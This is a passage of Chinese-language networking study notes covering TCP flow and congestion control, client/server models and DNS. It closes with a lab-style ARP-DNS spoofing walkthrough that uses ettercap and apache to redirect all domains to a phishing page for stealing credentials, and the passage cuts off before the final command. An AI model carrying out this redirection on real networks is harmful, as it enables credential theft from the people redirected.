窗口比例因子（window scale）：

- 建立连接时，双方可以协商一个窗口比例因子
- 实际接收窗口大小 = window size * 2^window scale

选择确认（SACK）：

- 最初的TCP协议只使用累积确认
- 改进的TCP协议引入选择确认，允许接收端指出缺失的数据字节

发送序号和确认序号的含义

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604000622007.png" alt="image-20220604000622007" style="zoom:50%;" />

#### 2.5.4.6 流量控制

##### 目的

接收方希望发送方发慢一点，好来得及接收。

##### 方法

利用**滑动窗口**机制实现流量控制。

在通信过程中，接收方根据自己接收缓存的大小，动态地调整发送方的发送窗口大小，即接收窗口rwnd（接收方设置确认报文段的窗口字段来将rwnd通知给发送方），发送方的发送窗口取接收窗口rwnd和拥塞窗口cwnd的最小值。

##### 举例

开始时，B通知A：“老弟，我的接收窗口是400”。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514170310436.png" alt="image-20220514170310436" style="zoom:67%;" />

注：填充黄色的为发送方A的发送窗口，绿色字体代表已发送的数据（接收方不一定接收，看ack)。

最后，B通知A接收窗口为0，这时，B可能在忙着给应用层传输数据。那么，什么时候A可以再给B发送数据呢？需要B再次给A发送一个报文段，通知A“老弟，你可以发送数据了,rwnd=xxx”。

但是，假如B发送的这个报文，A没有收到，这时A等待B通知，B等待A发送数据，就会死锁。为了解决这个问题，需要使用**坚持计时器。**

在发送方收到接收方的rwnd=0时，坚持计时器启动。坚持计时器到期，发送方发送**零窗口探测报文段（仅1字节）**，询问接收方“老哥，你还不接收数据吗？”，如果B给A发送过了通知，这时接收到发送方的探测报文段，就知道它的通知丢失了，A没有收到，就会再发送通知，A接收到后继续发送数据，双方正常通信。

注：TCP规定，即使设置为**零窗口**，也必须接收以下几种报文段：零窗口探测报文段、确认报文段和携带紧急数据的报文段。

##### 例题

[例题]主机甲和主机乙之间已建立了一个TCP连接，TCP最大段长度为1000字节。若主机甲的当前拥塞窗口为**4000**字节，在主机甲向主机乙连续发送两个最大段后，成功收到主机乙发送的**第一个段的确认段**，确认段中通告的接收窗口大小为2000字节，则此时主机甲还可以向主机乙发送的最大字节数是
A.1000 B.2000 C.3000 D.4000

[解析]发送窗口 = Min{rwnd，cwnd} = Min{2000,4000}=2000。第一个1000字节已确认，窗口滑动，第一个1000字节不在发送窗口中。由于第二个1000字节没有被主机乙确认，可能丢失，存在需要重传的可能性，这1000字节还在发送窗口中，因此，还可以发送的最大字节数是2000-1000=1000字节。之后主机甲等待主机乙确认或超时重传

##### TCP流量控制

**TCP接收端**

使用显式的窗口通告，告知发送方可用的缓存空间大小
在接收窗口较小时，推迟发送确认
仅当接收窗口显著增加时，通告新的窗口大小

**TCP发送端**

使用Nagle算法确定发送时机
使用接收窗口限制发送的数据量，已发送未确认的字节数不超过接收窗口的大小

> Nagle算法的解决方法：
>
> - 在新建连接上，当应用数据到来时，组成一个TCP段发送（那怕只有一个字节）
> - 在收到确认之前，后续到来的数据放在发送缓存中
> - 当数据量达到一个MSS或上一次传输的确认到来（取两者的较小时间），用一个TCP段将缓存的字节全部发走
>
> Nagle算法的优点：
>
> 适应网络延时、MSS长度及应用速度的各种组合 常规情况下不会降低网络的吞吐量

#### 2.5.4.7 拥塞控制

**拥塞**是指网络中报文数量过多，使得服务端来不及处理，以致引起这部分乃至整个网络性能下降的现象，严重时甚至会导致网络通信业务陷入停顿即出现死锁现象。发送方根据自己感知的网络拥塞程度，限制其发送速率

TCP 采用拥塞控制算法来减少或者避免拥塞现象的发生，TCP 的拥塞算法有过多种实现，包括 Tahoe、Reno、 NewReno、Vegas、Hybla、BIC 、CUBIC、SACK、Westwood、PRR、BBR 等。

##### 拥塞控制的类型

1.网络辅助的拥塞控制

- 路由器向端系统提供显式的反馈，例如：
  - 设置拥塞指示比特
  - 给出发送速率指示
- ATM、X.25采用此类方法

2.端到端拥塞控制

- 网络层不向端系统提供反馈
- 端系统通过观察丢包和延迟，自行推断拥塞的发生
- TCP采用此类方法

**出现条件**：资源需求总和>可用资源。

**目的**：防止过多的数据注入到网络中。

**假设**：数据**单方向传送**，另一方向只传送确认，发送方接到确认后增加拥塞窗口大小。接收方有足够大的缓存空间，发送窗口取决于拥塞程度，即**发送窗口=拥塞窗口**。

为了讨论方便，纵坐标的单位为**最大报文段，**长度为MSS。横纵标单位为发送了一批报文段并收到他们确认的时间，即**往返时延RTT**。

下面的算法，可查看[RFC 5681](https://tools.ietf.org/html/rfc5681#page-4)

##### 慢开始与拥塞避免

**ssthresh**（slow start thresh）：慢开始阈值，达到后“加法增大”。

**乘法减小**：新的ssthresh为上次拥塞状态下**拥塞窗口的一半**，RFC 5681中写的是ssthresh = max (FlightSize / 2, 2*SMSS)，我们这里就直接采用FlightSize / 2了。

**慢开始**：起始值特别低，例如1，倍增，超时后回到起始值。

**拥塞避免**：达到ssthresh后，加法增大。达到网络拥塞状态后，拥塞窗口回归到慢开始状态即初始值。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514170854413.png" alt="image-20220514170854413" style="zoom:50%;" />

开始值为1，未达到ssthresh前，执行慢开始算法，倍增，1、2、4、8、16；达到ssthresh，执行拥塞避免算法，加法增大，17、18、19、...、24，超时，新的ssthresh=24/2=12，回到1，后续类似。

##### TCP拥塞控制要解决的问题

**1.发送方如何感知网络拥塞？**

发送方利用丢包事件感知拥塞：

- 拥塞造成丢包和分组延迟增大
- 无论是丢包还是分组延迟过大，对于发送端来说都是丢包了

丢包事件包括：

- 重传定时器超时
- 发送端收到3个重复的ACK

**2.发送方采用什么机制限制发送速率?**

发送方使用拥塞窗口cwnd限制已发送未确认的数据量:LastByteSent-LastByteAcked <= cwnd

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604163233936.png" alt="image-20220604163233936" style="zoom:25%;" />

cwnd随发送方感知的网络拥塞程度而变化。

**3.发送方感知到网络拥塞后，采取什么策略调节发送速率？**

**①AIMD**

乘性减（Multiplicative Decrease）

- 发送方检测到丢包后，将cwnd的大小减半（但不能小于一个MSS）
- 目的：迅速减小发送速率，缓解拥塞

加性增（Additive Increase）

- 若无丢包，每经过一个RTT，将cwnd增大一个MSS，直到检测到丢包
- 目的：缓慢增大发送速率，避免振荡

**注**：MSS是发送速率TCP建立连接时双方确定的每一个报文段所能承载的最大数据长度

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604163632297.png" alt="image-20220604163632297" style="zoom:33%;" />

**②TCP慢启动**

慢启动的策略：

- 每经过一个RTT，将cwnd加倍

慢启动的具体实施：

- 每收到一个ACK段，cwnd增加一个MSS
- 只要发送窗口允许，发送端可以立即发送下一个报文段

特点：

- 以一个很低的速率开始，按指数增大发送速率

**区分不同的丢包事件**

> 超时：说明网络交付能力很差
>
> 收到3个重复的ACK：说明网络仍有一定的交付能力

收到3个重复的ACK：

- 将cwnd降至一半
- 使用AIMD调节cwnd

超时：

- 设置门限 =cwnd/2
- cwnd=1MSS
- 使用慢启动增大cwnd至门限
- 使用AIMD调节cwnd

##### TCP拥塞控制的实现

发送方维护变量ssthresh
发生丢包时，ssthresh=cwnd/2
ssthresh是从慢启动转为拥塞避免的分水岭：

- cwnd低于门限时，执行慢启动
- cwnd高于门限：执行拥塞避免

拥塞避免阶段，拥塞窗口线性增长：

- 每当收到ACK， cwnd=cwnd + MSS*(MSS/cwnd)

检测到3个重复的ACK后：

- TCP Reno实现： cwnd= ssthresh+3，线性增长
- TCP Tahoe实现：cwnd=1 MSS，慢启动

快速重传：TCP发送方在未达到重传时间时收到接收方的冗余确认（三个重复的，加上之前收到的，共4个一样的ack）就要重传已发送的报文段。

快恢复：达到网络拥塞状态后，拥塞窗口不是回归到初始状态，而是从**新的ssthresh（原来的减半）开始，加法增大。**

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514170942488.png" alt="image-20220514170942488" style="zoom:50%;" />

开始值为1，未达到ssthresh前，执行慢开始算法，倍增，1、2、4、8、16；达到ssthresh，执行拥塞避免算法，加法增大，17、18、19、...、24，收到3个重复的确认，新的ssthresh=24/2=12，回到新的ssthresh即12，后续类似。

**TCP发送端的事件与动作**

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604164234334.png" alt="image-20220604164234334" style="zoom:50%;" />

##### 例题

[例题] 一个TCP连接总是以1KB的最大段长发送TCP段，发送方有足够多的数据要发送。当拥塞窗口为16KB时发生了超时，如果接下来的4个RTT时间内的TCP段的传输都是成功的，那么当第四个RTT时间内发送的所有TCP段都得到肯定应答时，拥塞窗口大小是

A. 7KB B.8KB C.9KB D.16KB

[解析]由题可知是超时而不是收到3个重复确认，所以采用的是慢开始与拥塞避免算法。超时后进行下一轮，新的ssthresh=16/2=8。4个RTT拥塞窗口分别为1、2、4、8，此时达到新的ssthresh，所以拥塞窗口采用加法增大，应该是9KB，选择C选项。

[例题]主机甲和主机乙已建立了TCP连接，甲始终以MSS= 1KB大小的段发送数据，并一直有数据发送；乙每收到一个数据段都会发出一个接收窗口为10KB的确认段。若甲在t时刻发生超时时拥塞窗口为8KB，则从t时刻起，不再发生超时的情况下，经过10个RTT后，甲的发送窗口是

A.10KB B.12KB C.14KB D.15KB

[解析]超时后，新的ssthresh=8/2=4。拥塞窗口慢开始阶段变化为1、2、4，之后进入拥塞避免阶段，5、6、7、8、9、10、11，之后拥塞窗口是12。注意，题目问的是发送窗口，发送窗口大小为Min{10,12}=10KB，选择选项A。

#### 2.5.4.8  TCP和UDP的区别

| 比较项    | TCP      | UDP      |
| --------- | -------- | -------- |
| 面向连接  | 是       | 否       |
| 可靠/安全 | 是       | 否       |
| 速度      | 慢       | 快       |
| 面向      | 字节流   | 报文     |
| 应用范围  | 大量数据 | 少量数据 |

#### 2.5.4.9  实战

自己抓包，分析一下各个字段。以百度为例。

https://blog.csdn.net/lady_killer9/article/details/109587532

#### 2.5.4.10  参考

- 《TCP/IP详解卷1》第17-24章

- 《计算机网络（谢希仁）第七版》5.3-5.9

- [RFC 2581](https://datatracker.ietf.org/doc/rfc2581/?include_text=1)

- [(传输层)TCP协议 - kzangv - 博客园](https://www.cnblogs.com/kzang/articles/2582957.html)

- [RFC 793 TRANSMISSION CONTROL PROTOCOL](https://tools.ietf.org/html/rfc793)

- [RFC 2001 TCP Slow Start, Congestion Avoidance, Fast Retransmit, and Fast Recovery Algorithms](https://tools.ietf.org/html/rfc2001)

- [RFC 3390 Increasing TCP's Initial Window](https://tools.ietf.org/html/rfc3390)

- [RFC 5681 TCP Congestion Control](https://tools.ietf.org/html/rfc5681)

- [TCP congestion control wiki](https://en.wikipedia.org/wiki/TCP_congestion_control)

   

## 2.6 应用层

### 2.6.1 应用层概述

每个应用层协议都是为了解决某一应用问题，通过位于不同主机中的多个应用进程之间的通信和协同工作来完成

- 两台主机通信实际是其对应的两个应用进程(process)在通信
- **应用进程**: 为解决具体应用问题而彼此通信的进程

应用层的具体内容就是规定应用进程在通信时所遵循的协议

- 客户/服务器（C/S, Client/Server）方式
- 对等（P2P，Peer to Peer）方式

#### 2.6.1.1 应用进程通信方式

##### 1.客户机/服务器结构(Client/Server,C/S)

应用层的许多协议是基于C/S方式，例如，在移动互联网环境下，每个应用APP都是一个客户端。

- 客户(client)和服务器(server)是指通信中所涉及的2个应用进程
- 客户/服务器方式描述的是应用进程之间服务和被服务的关系
- 客户是服务请求方（主动请求服务，被服务）
- 服务器是服务提供方（被动接受服务请求，提供服务）

C/S方式可以是面向连接的，也可以是无连接的

面向连接时，C/S通信关系一旦建立，通信就是双向的，双方地位平等，都可发送和接收数据

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604171148624.png" alt="image-20220604171148624" style="zoom:50%;" />

**客户进程的特点**

- 在进行通信时临时成为客户，它也可在本地进行其它的计算
- 用户计算机上运行，在打算通信时主动向远地服务器发起通信
- 客户方必须知道服务器进程所在主机的IP地址才能发出服务请求
- 需要时可以与多个服务器进行通信

**服务器进程的特点**

- 专门用来提供某种服务的程序，可“同时”处理多个远地或本地客户的请求
- **必须始终处于运行状态才有可能提供服务**
- 通信开始之前服务器进程不需要知道客户进程所在主机的IP地址，无论客户请求来自哪里，服务器进程被动等待服务请求的到来即可
- 通常是当系统启动时即自动调用并一直运行着。某些服务器程序也可以由用户或其它进程在通信前启动
- **被动等待**并接受来自多个客户的通信请求

##### 2.点对点结构（Peer-to-Peer,P2P）(对等方式)

**对等方式**是指两个进程在通信时并不区分服务的请求方和服务的提供方

- 只要两个主机都运行P2P软件，它们就可以进行平等、对等的通信
- 双方都可以下载对方存储在硬盘中的共享文档，如果权限允许的话

音频/视频应用推动了P2P对等通信方式的发展（BitTorrent）
P2P方式从本质上看仍然是使用了C/S方式，但强调的是通信过程中的对等，这时每一个P2P进程既是客户同时也是服务器

- 没有永远在线的服务器
- 节点间歇性接入网络
- 节点可能改变IP地址
- **优点：**高度可伸缩
- **缺点：**难于管理

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604171720912.png" alt="image-20220604171720912" style="zoom:50%;" />

##### 3.混合结构(Hybrid)

**Napster**（一个应用）

- 文件传输使用P2P结构
- 文件的搜索采用C/S结构----集中式
  - 每个节点向服务器登记自己的内容
  - 每个节点向服务器体检查询请求，查找自己感兴趣的内容

#### 2.6.1.2 网络应用进程通信

**进程间的通信是利用socket发送/接收消息来实现的。**

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508165812758.png" alt="image-20220508165812758" style="zoom: 67%;" />

类似于寄信：

- 发送方将消息送到门外邮箱
- 发送方依赖传输基础设施将消息传到接收方所在的主机，并送到接收方门外
- 接收方从门外获取消息

传输基础设施向进程提供API

- 传输协议的选择
- 参数的设置

##### 进程定位

采用IP地址定位方式来寻址主机，有了主机的IP地址后，并不足以定位进程，因为主机上同时可能会跑很多进程。操作系统会给每个需要通信的进程分配一个端口号（Port number）。但是有的端口号是分配给固定的进程的，如：HTTP Server采用80端口，Mail Server采用25端口等等。

进程标识符：IP地址+端口号

```powershell
netstat
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508170922099.png" alt="image-20220508170922099" style="zoom:50%;" />

##### 应用层协议

网络应用需遵循应用层协议。

1.公开协议

- 有[RFC（Request For Comments）](https://ietf.org/rfc.html)定义
- 允许互操作
- HTTP，SMTP等等

2.私有协议

- 多数P2P文件共享应用

#### 2.6.1.3 服务器进程工作方式

**1.循环方式(iterative mode)**

- 一次只运行一个服务进程
- 当有多个客户进程请求服务时，服务进程就按请求的先后顺序依次做出响应 (阻塞方式)

**2.并发方式(concurrent mode)**

- 可以同时运行多个服务进程
- 每一个服务进程都对某个特定的客户进程做出响应 (非阻塞方式)

**3.无连接循环方式服务**

- 使用无连接的UDP服务进程通常都工作在循环方式，即一个服务进程在同一时间只能向一个客户进程提供服务。(顺序服务)

- 服务进程收到客户进程的请求后，就发送UDP用户数据报响应该客户
- 对其他客户进程发来的请求则暂时不予理睬，这些请求都在服务端的队列中排队等候服务进程的处理
- 当服务进程处理完毕一个请求时，就从队列中读取来自下一个客户进程的请求，然后继续处理

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604172212344.png" alt="image-20220604172212344" style="zoom:50%;" />

**4.面向连接的并发方式服务**

- 面向连接的TCP服务进程通常都工作在并发服务方式，服务进程在同一时间可同时向多个客户进程提供服务。(并发服务)
- 在TCP服务进程与多个客户进程之间必须建立多条TCP连接，每条TCP连接在其数据传送完毕后释放
- 一个TCP连接对应一个（熟知）服务端口
- 主服务进程在熟知端口等待客户进程发出的请求。一旦收到客户的请求，就创建一个从属服务进程，并指明从属服务进程使用临时套接字与该客户建立TCP连接，然后主服务进程继续在原来的熟知端口等待向其他客户提供服务

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604172348686.png" alt="image-20220604172348686" style="zoom:50%;" />

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604172434659.png" alt="image-20220604172434659" style="zoom:50%;" />

### 2.6.2 DNS域名系统

[DNS域名系统详解与DNS攻击](https://blog.csdn.net/lady_killer9/article/details/110562045)

#### 2.6.2.1 简介

DNS（Domain Name System，域名系统）是一个简单的请求-响应协议，是将**域名和IP地址相互映射**的一个分布式数据库，能够使人更方便地访问互联网。DNS使用**UDP协议**的 53 端口来传输。

名字到域名的解析是由**若干个**域名服务器程序完成的。域名服务器程序在专设的结点上运行，相应的结点也称为**名字服务器**(Name Server)或**域名服务器**(Domain Name Server)

#### 2.6.2.2 互联网域名结构

Internet采用**层次结构的命名树**作为主机的名字，并使用**分布式**的域名系统 DNS。Internet的DNS是一个**联机分布式数据库系统**。

下图为域名命名空间形成的树结构：

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604173554202.png" alt="image-20220604173554202" style="zoom:50%;" />

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604173623878.png" alt="image-20220604173623878" style="zoom:33%;" />

从语法来看，每个域名都是由**标号**序列构成，标号由**英文字母（不区分大小写）和数字**构成，不能超过**63个**字符（为记忆方便，一般不超过12个），标号之间使用"."来连接，完整域名不超过**255个**字符。

例如，mp.csdn.net，net是顶级域名，csdn是自己注册的二级域名，mp是自己注册的三级域名。

##### 顶级域名

顶级域名由ICANN进行管理，2012年统计，顶级域名TLD(Top Level Domain)有236个，分为三大类：

(1) 国家顶级域名n TLD：采用ISO 3166的规定。如：cn表示中国， us表示美国， uk表示英国， 等等.国家顶级域名又常记为ccTLD(cc表示国家代码country-code) ， 到2012年5月为止，国家顶级域名总数已达296个。

(2) 通用顶级域名gTLD：到2006年12月为止， 通用顶级域名的总数已经达到20个。最先确定的通用顶级域名有7个，即：com(公司企业) ， net(网络服务机构) ， org(非营利性组织) ， int(国际组织) ， edu(美国专用的教育机构) ， gov(美国的政府部门) ， mil表示(美国的军事部门) 。以后又陆续增加了13个通用顶级域名：acro(航空运输企业) ， asia(亚太地区) ， biz(公司和企业) ， cat(使用加泰隆人的语言和文化团体) ， coop(合作团体) ， info(各种情况) ， jobs(人力资源管理者) ， mobi(移动产品与服务的用户和提供者) ， museum(博物馆) ， name(个人) ， pro(有证书的专业人员) ， tel(Tel nic股份有限公司) ，travel(旅游业) 。

(3) 基础结构域名(infrastructure domain) ：这种顶级域名只有一个， 即**arpa**，用于**反向域名解析**(地址到名字)，因此又称为反向域名。

2011年ICANN批准新顶级域名，任何公司、机构都可以申请（当然，不一定通过），到2016年在ICANN注册的中文顶级域名已有60个。

##### 二级域名

我国把二级域名划分为“**类别域名**”和“**行政区域名**”两大类。
​“**类别域名**”共7个，分别为：ac（科研机构），com（工、商、金融等企业），edu（中国的教育机构），gov（中国的政府机构），mil（中国的国防机构），net（提供互联网络服务的机构），org（非营利性的组织）。
​“**行政区域名**”共34个，适用于我国的各省、自治区、直辖市。例如：bj（北京市），js(江苏省），等等。
​关于我国的互联网络发展现状以及各种规定（如申请域名的手续），均可在中国互联网网络信息中心CNNIC的网址上找到。

#### 2.6.2.3 域名服务器

上面讲的域名体系是抽象的。而实际上，域名服务器是**按区分的**，每个区设置相应的权限域名服务器(authoritative name server)，用来保存该区中的所有主机的**域名到IP地址的映射**。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220515225152126.png" alt="image-20220515225152126" style="zoom:50%;" />

##### 根服务器

根域名服务器是DNS的核心，负责互联网顶级域名的解析，用于维护域的权威信息，并将 DNS 查询引导到相应的域名服务器。

所有的根域名服务器都知道所有的顶级域名服务器的域名和IP地址。本地域名服务器无法解析时，就要询问根域名服务器。

根服务器在域名树中代表最顶级的域，一般省略。

13台IPv4根服务器的域名标号为a到m，即a.root-servers.org到m.root-servers.org，所有服务器存储的数据相同，仅包含ICANN批准的TLD域名权威信息。

更多内容可查看[RFC2870](https://www.rfc-editor.org/info/rfc2870)。

##### 顶级域名服务器

负责管理在该顶级域名服务器注册的所有二级域名。

##### 权威服务器

这就是负责一个区的域名服务器。当一个权限域名服务器还不能给出最后的查询回答时，就会告诉发出查询请求的DNS客户，下一步应当找哪一个权限域名服务器。例如在上图中，区abc.com和区y.abc.com各设有一个权限域名服务器。

权威服务器上存储域名Zone文件，维护域内域名的权威信息，递归服务器可以从权威服务器获得DNS查询的资源记录。

权威服务器需要在所承载的域名所属的TLD管理局注册，同一个权威服务器可以承载不同TLD域名，同一个域也可以有多个权威服务器。

##### 本地域名服务器

本地域名服务器并不属于树状域名服务器层次结构，但它对域名系统非常重要。当一台主机发出DNS查询请求时，这个查询请求报文就发送给本地域名服务器。每一个互联网服务提供者(ISP)、一个大学，甚至一个大学里的系，都可以拥有一个本地域名服务器，这种域名服务器有时也称为**默认域名服务器**。

当计算机使用Windows7操作系统时，打开“控制面板”，然后依次选择“网络和Internet”→“网络和共享中心”一“查看网络状态和任务”→“无线网络连接”（假定采用家庭网络）→“属性”→“Internet协议版本4”→“属性”等项目，就可以看见首选DNS服务器和备用DNS服务器的IP地址。这里的DNS服务器指的就是本地域名服务器。本地域名服务器离用户较近，一般不超过几个路由器的距离。当所要查询的主机也属于同一个本地ISP时，该本地域名服务器立即就能将所查询的主机名转换为它的IP地址，而不需要再去询问其他的域名服务器。

为了提高域名服务器的可靠性，DNS域名服务器都把数据复制到几个域名服务器来保存，其中的一个是主域名服务器（master name server)，其他的是辅助域名服务器（secondaryname server)。当主域名服务器出故障时，辅助域名服务器可以保证DNS的查询工作不会中断。主域名服务器定期把数据复制到辅助域名服务器中，而更改数据只能在主域名服务器中进行。这样就保证了数据的一致性。

##### （递归域名服务器）

递归服务器负责接收用户的查询请求，进行递归查询并响应用户查询请求。在初始时递归服务器仅有记录了根域名的Hint文件。

#### 2.6.2.4 术语

##### mDNS

Multicast DNS(mDNS)，多播DNS，使用5353端口，组播地址为224.0.0.251或\[FF02::FB\]。在一个没有常规DNS服务器的小型网络内可以使用mDNS来实现类似DNS的编程接口、包格式和操作语义。mDNS协议的报文与DNS的报文结构相同，但有些字段对于mDNS来说有新的含义。

启动mDNS的主机会在进入局域网后向所有主机组播消息，包含主机名、IP等信息，其他拥有相应服务的主机也会响应含有主机名和IP的信息。

mDNS的域名是用.local和普通域名区分开的。

##### FQDN

FQDN(Fully-Qualified Domain Name)是域名的完全形态，主要是包含零长度的根标签，例如www.example. com. 。

##### TLD

Top-Level Domain (TLD) 是属于根域的一个域，例如 com 或 jp 。

TLD 一般可以分为 Country Code Top-Level Domains (ccTLDs) 、Generic Top-Level Domains (gTLDs) 以及其它。

##### IDN

Internationalized Domain Names for Applications (IDNA) 是为了处理非 ASCII 字符的情况。

##### CNAME

CNAME 即 Canonical name，又称 alias，将域名指向另一个域名。

##### TTL

Time To Live，无符号整数，记录DNS记录过期的时间，最小是 0，最大是 2147483647 (2\^31 - 1)。

#### 2.6.2.5 DNS工作原理

##### 报文格式

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220515230343470.png" alt="image-20220515230343470" style="zoom: 50%;" />

##### 解析过程



以下为DNS的两种查询方式：

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220515230447256.png" alt="image-20220515230447256" style="zoom:50%;" />

**1.递归查询（上图a）**

理解：a询问b，b给a回复信息（b可能会问其他的）。

- 当收到查询请求报文的域名服务器不知被查询域名的IP地址时，该域名服务器就以DNS客户的身份向下一步应查询的域名服务器发出查询请求，即替本地域名字服务器继续查询

DNS解析过程一般是递归查询的，具体过程如下：

-   用户要访问域名[www.example.com](http://www.example.com/)时，先查看本机hosts是否有记录或者本机是否有DNS缓存，如果有，直接返回结果，否则向递归服务器查询该域名的IP地址

-   递归缓存为空时，首先向根服务器查询com顶级域的IP地址

-   根服务器告知递归服务器com顶级域名服务器的IP地址

-   递归向com顶级域名服务器查询负责example.com的权威服务器的IP

-   com顶级域名服务器返回相应的IP地址

-   递归向example.com的权威服务器查询[www.example.com](http://www.example.com/)的地址记录

-   权威服务器告知[www.example.com](http://www.example.com/)的地址记录

-   递归服务器将查询结果返回客户端

**2.迭代查询**

理解：a询问b，b让a找c，a询问c，c让a找d,...,a询问n，n告知a所需信息。

- 当收到查询请求报文的域名服务器不知道被查询域名的IP地址时，就把自己知道的下一步应查询的域名服务器IP地址告诉本地域名字服务器，由本地域名字服务器继续向该域名服务器查询，直到得到所要解析的域名的IP地址，或者查询不到所要解析的域名的IP地址

##### 域传送

DNS服务器可以分为主服务器、备份服务器和缓存服务器。域传送是指备份服务器从主服务器拷贝数据，并使用得到的数据更新自身数据库。域传送是在主备服务器之间同步数据库的机制。

#### 2.6.2.6 请求响应

##### DNS记录

- ##### A 记录

  -   返回域名对应的 IPv4 地址

- ##### NS 记录

  -   域名服务器

  -   返回该域名由哪台域名服务器解析

- ##### PTR 记录

  -   反向记录

  -   从 IP 地址到域名的记录

- ##### MX 记录

  -   电子邮件交换记录

  -   记录邮件域名对应的 IP 地址

##### 响应码

- ##### NOERROR

  ```
  No error condition
  ```

- ##### FORMERR

  ```
  Format error - The name server was unable to interpret the query
  ```

- ##### SERVFAIL

  ```
  Server failure - The name server was unable to process this query due to a problem with, the name server
  ```

- ##### NXDOMAIN

  ```
  this code signifies that the domain name referenced in the query does not exist
  ```

- ##### NOTIMP

  ```
  Not Implemented - The name server does not support the requested kind of query
  ```

- ##### REFUSED

  ```
  Refused - The name server refuses to perform the specified operation for policy reasons
  ```

- ##### NODATA

  ```
  A pseudo RCODE which indicates that the name is valid, for the given class, but [there] are no records of the given type A NODATA response has to be inferred from the answer.
  ```

#### 2.6.2.7 DNS利用

##### DGA

DGA（Domain Generate Algorithm，域名生成算法）是一种利用随机字符来生成C&C域名，从而逃避域名黑名单检测的技术手段，常见于botnet中。一般来说，一个DGA域名的存活时间约在1-7天左右。

通信时，客户端和服务端都运行同一套DGA算法，生成相同的备选域名列表，当需要发动攻击的时候，选择其中少量进行注册，便可以建立通信，并且可以对注册的域名应用速变IP技术，快速变换IP，从而域名和IP都可以进行快速变化。

DGA域名有多种生成方式，根据种子类型可以分为确定性和不确定性的生成。不确定性的种子可能会选用当天的一些即时数据，如汇率信息等。

##### DNS隧道

DNS隧道工具将进入隧道的其他协议流量封装到DNS协议内，在隧道上传输。这些数据包出隧道时进行解封装，还原数据。

#### 2.6.2.8 加密方案

作为主流的防御方案，DNS加密有五种方案，分别是DNS-over-TLS(DoT)、DNS-over-DTLS、DNS-over-HTTPS(DoH)、DNS-over-QUIC以及DNSCrypt。

##### DoT

DoT方案在2016年发表于RFC7858，使用853端口。主要思想是Client和 Server通过TCP协议建立TLS会话后再进行DNS传输，Client通过SSL证书验证服务器身份。

##### DNS-over-DTLS

DNS-over-DTLS和DoT类似，区别在于使用UDP协议而不是TCP协议。

##### DoH

DoH方案在发表RFC8484，使用https://dns.example.com/dns-query{?dns}来查询服务器的IP，复用https的443端口，流量特征比较小。DoH会对 DNS服务器进行加密认证，不提供fallback选项。目前Cloudflare、Google 等服务商对DoH提供了支持。

##### DNS-over-QUIC

DNS-over-QUIC安全特性和DoT类似，但是性能更高，目前没有合适的软件实现。

##### DNSCrypt

DNSCrypt使用X25519-XSalsa20Poly1305而非标准的TLS，DNSCrypt的 Client需要额外的软件，Server需要的专门的证书。

#### 2.6.2.9 DNS攻击实战

##### DNS劫持

DNS劫持有多种方式，比较**早期**的攻击方式是通过攻击域名解析服务器，或是伪造 DNS响应的方法，来将域名解析到恶意的IP地址。随着互联网应用的不断发展，出现了基于废弃记录的劫持方式。这种方式发生的场景是次级域名的解析记录指向第三方资源，而第三方资源被释放后，解析记录并没有取消，在这种场景下，可以对应申请第三方资源，以获取控制解析记录的能力。

黑客控制了域名管理密码和域名管理邮箱，然后将该域名的DNS纪录指向到黑客可以控制的DNS服务器，然后通过在该DNS服务器上添加相应域名纪录，从而使网民访问该域名时，进入了黑客所指向的内容。这显然是DNS服务提供商的责任，用户束手无策。

下表为公共DNS服务器IP：

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220515230810419.png" alt="image-20220515230810419" style="zoom:50%;" />

一般配置DNS使用8.8.8.8或114.114.114.114。

##### 例：ARP-DNS欺骗攻击步骤（[详解](C:\Users\86184\桌面\网安笔记\网安学习笔记\DNS劫持)）

###### 1.ettercap劫持的原理

局域网劫持, 攻击者通过**伪装成网关**, 劫持受害者的网络请求, 将网络请求拦截到指定的服务器

###### 2.DNS常用命令讲解

1.查看DNS缓存表

```
ipconfig /displaydns #显示电脑上的DNS缓存表
```

2.获取DNS地址

```
ping maishibing.com
```

2.刷新DNS缓存

```
ipconfig /flushdns
```

###### 3.劫持步骤

**1.kali开启apache服务**

**目的**：使攻击机的ip地址可以被别的主机通过其IP地址进行访问，以达到靶机可以访问服务器搭建在攻击机上的钓鱼网站的目的，通过诱骗用户输入账号和密码，来窃取用户隐私信息。

```
service apache2 start
```

**2.浏览器访问Apache的首页**

```
http://192.168.110.12
```

**3.编辑ettercap配置文件**

进入配置文件位置

```
cd /etc/ettercap
```

复制原有的配置文件（环境恢复比较方便）

```
cp etter.dns etter.dns1
```

设置dns劫持配置文件

```
vi /etc/ettercap/etter.dns
添加以下内容
*   A   192.168.110.12
*   PTR 192.168.110.12
wq保存
参数
*:代表所有的网站 也可设置某个网站 www.mashibing.com
A:代表钓鱼的ip地址
PRT ：常被用于反向地址解析
```

<img src="C:/Users/86184/%E6%A1%8C%E9%9D%A2/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/DNS%E5%8A%AB%E6%8C%81/dns%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png" alt="dns配置文件" style="zoom:50%;" />

ettercap劫持命令讲解

```
